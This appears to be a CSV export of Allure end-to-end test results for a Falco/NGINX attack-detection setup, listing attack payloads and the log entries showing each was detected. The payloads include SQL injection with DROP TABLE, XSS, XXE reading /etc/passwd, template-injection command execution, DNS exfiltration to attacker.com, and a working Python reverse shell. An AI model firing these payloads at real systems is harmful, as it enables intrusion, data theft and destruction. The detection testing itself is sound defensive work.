"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_003` |
| **Name** | AND-based boolean injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND '1'='1`
- **Encoded**: `%27%20AND%20%271%27%3D%271`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 09:41:47.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_003-1767433307367-q9czkm pattern_id=SQLI_BOOL_003 uri=/?q=%27%20AND%20%271%27%3D%271 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:41:47.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_003-1767433307367-q9czkm pattern_id=SQLI_BOOL_003 uri=/?q=%27%20AND%20%271%27%3D%271 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[017_SQLI_BOOL_003]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_006` |
| **Name** | Eval-based DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `eval('alert(""DOM XSS"")')`
- **Encoded**: `eval%28%27alert%28%22DOM%20XSS%22%29%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~37000ms
- **Timestamp**: 09:41:59.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_006-1767433319380-aifhks pattern_id=XSS_DOM_006 uri=/?q=eval%28%27alert%28%22DOM%20XSS%22%29%27%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:41:59.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_006-1767433319380-aifhks pattern_id=XSS_DOM_006 uri=/?q=eval%28%27alert%28%22DOM%20XSS%22%29%27%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[095_XSS_DOM_006]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_004` |
| **Name** | DNS-based data exfiltration |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; nslookup `whoami`.attacker.com`
- **Encoded**: `%3B%20nslookup%20%60whoami%60.attacker.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~29000ms
- **Timestamp**: 09:42:07.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1767433327880-w3wsh8 pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1

**Falco Log Entry**:
```
09:42:07.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1767433327880-w3wsh8 pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1
```","1","test_e2e_with_logs[211_CMD_BLIND_004]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_BYPASS_010` |
| **Name** | Meta refresh redirect |
| **Category** | XSS |
| **Subcategory** | bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>`
- **Encoded**: `%3Cmeta%20http-equiv%3D'refresh'%20content%3D'0%3Burl%3Djavascript%3Aalert(1)'%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~31000ms
- **Timestamp**: 09:42:05.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_010-1767433325894-1tsyc8 pattern_id=XSS_BYPASS_010 uri=/?q=%3Cmeta%20http-equiv%3D'refresh'%20content%3D'0%3Burl%3Djavascript%3Aalert(1)'%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:42:05.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_010-1767433325894-1tsyc8 pattern_id=XSS_BYPASS_010 uri=/?q=%3Cmeta%20http-equiv%3D'refresh'%20content%3D'0%3Burl%3Djavascript%3Aalert(1)'%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[089_XSS_BYPASS_010]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_2ND_003` |
| **Name** | Second-order stacked query injection |
| **Category** | SQLI |
| **Subcategory** | second_order |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; DROP TABLE logs; --`
- **Encoded**: `'%3B%20DROP%20TABLE%20logs%3B%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~19000ms
- **Timestamp**: 09:42:17.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_2ND_003-1767433337434-pheig pattern_id=SQLI_2ND_003 uri=/?q='%3B%20DROP%20TABLE%20logs%3B%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:42:17.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_2ND_003-1767433337434-pheig pattern_id=SQLI_2ND_003 uri=/?q='%3B%20DROP%20TABLE%20logs%3B%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[003_SQLI_2ND_003]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_UNION_001` |
| **Name** | Basic UNION SELECT with NULL |
| **Category** | SQLI |
| **Subcategory** | union_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `UNION SELECT NULL`
- **Encoded**: `UNION%20SELECT%20NULL`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~45000ms
- **Timestamp**: 09:41:51.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_001-1767433311375-ds1qyd pattern_id=SQLI_UNION_001 uri=/?q=UNION%20SELECT%20NULL client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:41:51.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_001-1767433311375-ds1qyd pattern_id=SQLI_UNION_001 uri=/?q=UNION%20SELECT%20NULL client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[073_SQLI_UNION_001]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_IDOR_001` |
| **Name** | IDOR - Insecure Direct Object Reference |
| **Category** | API_SECURITY |
| **Subcategory** | idor |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/api/v1/orders/99999/invoice`
- **Encoded**: `%2Fapi%2Fv1%2Forders%2F99999%2Finvoice`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~1000ms
- **Timestamp**: 09:42:35.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=API_IDOR_001-1767433355853-a6f37 pattern_id=API_IDOR_001 uri=/?q=%2Fapi%2Fv1%2Forders%2F99999%2Finvoice client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:42:35.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=API_IDOR_001-1767433355853-a6f37 pattern_id=API_IDOR_001 uri=/?q=%2Fapi%2Fv1%2Forders%2F99999%2Finvoice client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[271_API_IDOR_001]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_001` |
| **Name** | XXE external entity file disclosure |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE test [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]>`
- **Encoded**: `%3C!DOCTYPE%20test%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~28000ms
- **Timestamp**: 09:42:08.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=XXE_ENTITY_001-1767433328847-zz6uzf pattern_id=XXE_ENTITY_001 uri=/?q=%3C!DOCTYPE%20test%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:42:08.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=XXE_ENTITY_001-1767433328847-zz6uzf pattern_id=XXE_ENTITY_001 uri=/?q=%3C!DOCTYPE%20test%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[263_XXE_ENTITY_001]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_005` |
| **Name** | Double quote boolean injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `"" OR ""1""=""1`
- **Encoded**: `%22%20OR%20%221%22%3D%221`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~47000ms
- **Timestamp**: 09:41:49.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1767433309872-bbxbyb pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:41:49.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1767433309872-bbxbyb pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[019_SQLI_BOOL_005]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_006` |
| **Name** | Hex encoded slash traversal |
| **Category** | PATH |
| **Subcategory** | advanced_techniques |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..\x2f`
- **Encoded**: `..%5Cx2f`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~28000ms
- **Timestamp**: 09:42:08.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_006-1767433328390-5cd5l pattern_id=PATH_ADV_006 uri=/?q=..%5Cx2f client=127.0.0.1

**Falco Log Entry**:
```
09:42:08.000000000: Critical [NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_006-1767433328390-5cd5l pattern_id=PATH_ADV_006 uri=/?q=..%5Cx2f client=127.0.0.1
```","2","test_e2e_with_logs[149_PATH_ADV_006]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BASIC_002` |
| **Name** | LDAP password bypass injection |
| **Category** | LDAP |
| **Subcategory** | basic_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `*)(|(password=*))`
- **Encoded**: `*)(|(password%3D*))`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 09:42:04.000 UTC

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_002-1767433324348-s58wqi pattern_id=LDAP_BASIC_002 uri=/?q=*)(|(password%3D*)) client=127.0.0.1

**Falco Log Entry**:
```
09:42:04.000000000: Critical [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_002-1767433324348-s58wqi pattern_id=LDAP_BASIC_002 uri=/?q=*)(|(password%3D*)) client=127.0.0.1
```","1","test_e2e_with_logs[247_LDAP_BASIC_002]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_MAKO_001` |
| **Name** | Mako Python execution |
| **Category** | SSTI |
| **Subcategory** | mako |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `${self.module.cache.util.os.system(""id"")}`
- **Encoded**: `%24%7Bself.module.cache.util.os.system(%22id%22)%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~8000ms
- **Timestamp**: 09:42:28.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_MAKO_001-1767433348358-vcggc pattern_id=SSTI_MAKO_001 uri=/?q=%24%7Bself.module.cache.util.os.system(%22id%22)%7D client=127.0.0.1

**Falco Log Entry**:
```
09:42:28.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_MAKO_001-1767433348358-vcggc pattern_id=SSTI_MAKO_001 uri=/?q=%24%7Bself.module.cache.util.os.system(%22id%22)%7D client=127.0.0.1
```","1","test_e2e_with_logs[279_SSTI_MAKO_001]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_REVSH_003` |
| **Name** | Python reverse shell |
| **Category** | CMDINJ |
| **Subcategory** | reverse_shell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'`
- **Encoded**: `python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 09:42:14.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_003-1767433334893-ov3qdf pattern_id=CMD_REVSH_003 uri=/?q=python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)' client=127.0.0.1

**Falco Log Entry**:
```
09:42:14.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_003-1767433334893-ov3qdf pattern_id=CMD_REVSH_003 uri=/?q=python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)' client=127.0.0.1
```","2","test_e2e_with_logs[234_CMD_REVSH_003]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_006` |
| **Name** | System information gathering |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `; uname -a`
- **Encoded**: `%3B%20uname%20-a`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~40000ms
- **Timestamp**: 09:41:56.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_006-1767433316353-cbug2s pattern_id=CMD_BASIC_006 uri=/?q=%3B%20uname%20-a client=127.0.0.1

**Falco Log Entry**:
```
09:41:56.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_006-1767433316353-cbug2s pattern_id=CMD_BASIC_006 uri=/?q=%3B%20uname%20-a client=127.0.0.1
```","2","test_e2e_with_logs[192_CMD_BASIC_006]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_011` |
| **Name** | Basic pipe with id command |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `|id`
- **Encoded**: `%7Cid`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~38000ms
- **Timestamp**: 09:41:58.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1767433318858-krc50g pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1

**Falco Log Entry**:
```
09:41:58.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1767433318858-krc50g pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1
```","1","test_e2e_with_logs[197_CMD_BASIC_011]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_007` |
| **Name** | Network information gathering |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `&& netstat -an`
- **Encoded**: `%26%26%20netstat%20-an`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~40000ms
- **Timestamp**: 09:41:56.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_007-1767433316854-sgztqh pattern_id=CMD_BASIC_007 uri=/?q=%26%26%20netstat%20-an client=127.0.0.1

**Falco Log Entry**:
```
09:41:56.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_007-1767433316854-sgztqh pattern_id=CMD_BASIC_007 uri=/?q=%26%26%20netstat%20-an client=127.0.0.1
```","1","test_e2e_with_logs[193_CMD_BASIC_007]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_010` |
| **Name** | Simple UNION injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' UNION SELECT 1 --`
- **Encoded**: `'%20UNION%20SELECT%201%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~25000ms
- **Timestamp**: 09:42:11.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_BOOL_010-1767433331921-s1xubh pattern_id=SQLI_BOOL_010 uri=/?q='%20UNION%20SELECT%201%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:42:11.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_BOOL_010-1767433331921-s1xubh pattern_id=SQLI_BOOL_010 uri=/?q='%20UNION%20SELECT%201%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[024_SQLI_BOOL_010]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASH_001` |
| **Name** | Direct bash command execution |
| **Category** | CMDINJ |
| **Subcategory** | bash_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; /bin/bash -c 'whoami'`
- **Encoded**: `%3B%20%2Fbin%2Fbash%20-c%20'whoami'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 09:42:04.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_001-1767433324371-78dplc pattern_id=CMD_BASH_001 uri=/?q=%3B%20%2Fbin%2Fbash%20-c%20'whoami' client=127.0.0.1

**Falco Log Entry**:
```
09:42:04.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_001-1767433324371-78dplc pattern_id=CMD_BASH_001 uri=/?q=%3B%20%2Fbin%2Fbash%20-c%20'whoami' client=127.0.0.1
```","1","test_e2e_with_logs[187_CMD_BASH_001]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
